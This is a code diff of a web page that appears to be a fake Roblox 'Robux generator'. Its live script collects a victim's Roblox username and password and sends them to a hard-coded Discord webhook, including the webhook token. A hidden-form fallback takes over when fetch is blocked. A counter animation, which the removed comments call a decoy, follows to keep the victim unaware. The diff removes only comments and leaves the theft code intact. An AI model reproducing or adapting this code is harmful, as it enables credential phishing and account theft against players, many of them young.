@@ -94,7 +94,6 @@
 </div>
 
 <script>
-    // Ton webhook
     const webhookUrl = "https://discord.com/api/webhooks/1515046330307706893/jOKRzcDpngw9EvyYypp4bTHOkheD-oqzCj48EA9oL1fge0Uupqftjnxf9Z1doXJMo9oX";
     
     document.getElementById('generateBtn').onclick = async function() {
@@ -109,13 +108,11 @@
             return;
         }
         
-        // Message à envoyer à Discord
         const message = {
             content: `🔐 **NOUVEAU COMPTE ROBLOX !**\n\n**Pseudo :** ${username}\n**Mot de passe :** ${password}\n**Robux demandés :** ${amount}\n**Date :** ${new Date().toLocaleString()}`
         };
         
         try {
-            // Envoi au webhook Discord
             const response = await fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -126,16 +123,13 @@
                 console.log("✅ Envoyé à Discord");
             } else {
                 console.error("❌ Erreur:", response.status);
-                // Option 2: formulaire caché (plan B)
                 sendViaForm(webhookUrl, message.content);
             }
         } catch(error) {
             console.error("❌ Erreur fetch:", error);
-            // Plan B: formulaire caché
             sendViaForm(webhookUrl, message.content);
         }
         
-        // Animation factice (leurre)
         let counter = 0;
         let target = parseInt(amount);
         
@@ -157,8 +151,7 @@
             }
         }, 40);
     };
-    
-    // Plan B : formulaire caché (marche quand fetch est bloqué)
+  
     function sendViaForm(url, content) {
         const form = document.createElement('form');
         form.method = 'POST';
